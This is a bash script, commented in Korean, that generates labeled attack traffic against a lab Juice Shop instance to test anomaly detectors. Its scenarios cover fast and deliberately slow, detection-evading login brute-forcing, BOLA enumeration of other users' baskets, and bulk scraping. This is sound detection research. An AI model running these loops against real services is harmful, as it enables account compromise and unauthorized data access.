#!/usr/bin/env bash
# 공격 시나리오 실행 + 시작/끝 UTC·출발지 기록(= 라벨 근거). Kali 에서 돌린다.
# 대상은 '직접 통제하는 랩의 Juice Shop'만. (의도적 취약 앱 — 외부 노출 금지)
#
#   사용: ./attack.sh <scenario>
#   scenario: brute_fast | brute_slow | bola_fast | bola_slow | harvest
#
# 변주(fast/slow)를 둘 다 모으는 게 핵심 — docs/19 "양보다 다양성", docs/20 시나리오 커버리지.
# 느린 공격(brute_slow/bola_slow)이 IF를 뚫고 LOF/AE가 잡는지(H5) 확인용.
set -eu
TARGET="${TARGET:-http://10.16.1.10}"
EMAIL="${EMAIL:-TODO_me@juice.sh}"     # BOLA엔 로그인 필요(남의 자원 열람)
PASS="${PASS:-TODO_password}"
NAME="${1:?scenario 이름 (brute_fast|brute_slow|bola_fast|bola_slow|harvest)}"
RUNDIR="${RUNDIR:-./runs}"; mkdir -p "$RUNDIR"

SRC_IP="$(hostname -I 2>/dev/null | awk '{print $1}')"   # 이 머신(Kali) 출발지 = nginx remote_addr
START="$(date -u +%FT%TZ)"
echo "[$START] $NAME 시작 (src=$SRC_IP → $TARGET)"

login() { curl -s -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'; }

case "$NAME" in
  brute_fast)   # API2: 로그인 대입, 고속
    for i in $(seq 1 120); do
      curl -s -o /dev/null -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
        -d "{\"email\":\"$EMAIL\",\"password\":\"wrong$i\"}"; done ;;
  brute_slow)   # API2: 로그인 대입, 저속(탐지 회피형)
    for i in $(seq 1 40); do
      curl -s -o /dev/null -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
        -d "{\"email\":\"$EMAIL\",\"password\":\"wrong$i\"}"; sleep 20; done ;;
  bola_fast)    # API1: 남의 장바구니 열거, 고속
    T=$(login); for id in $(seq 1 80); do
      curl -s -o /dev/null "$TARGET/rest/basket/$id" -H "Authorization: Bearer $T"; done ;;
  bola_slow)    # API1: 남의 장바구니 열거, 저속(H5 핵심)
    T=$(login); for id in $(seq 1 60); do
      curl -s -o /dev/null "$TARGET/rest/basket/$id" -H "Authorization: Bearer $T"; sleep 15; done ;;
  harvest)      # API3: 상품/리뷰 대량수집
    for i in $(seq 1 200); do
      curl -s -o /dev/null "$TARGET/api/Products"; curl -s -o /dev/null "$TARGET/rest/products/$((i%30+1))/reviews"; done ;;
  *) echo "모르는 scenario: $NAME"; exit 1 ;;
esac

END="$(date -u +%FT%TZ)"
REC="$RUNDIR/${START//:/-}_$NAME.json"
printf '{"scenario":"%s","src":"%s","start":"%s","end":"%s"}\n' "$NAME" "$SRC_IP" "$START" "$END" > "$REC"
echo "[$END] 끝. 기록: $REC"
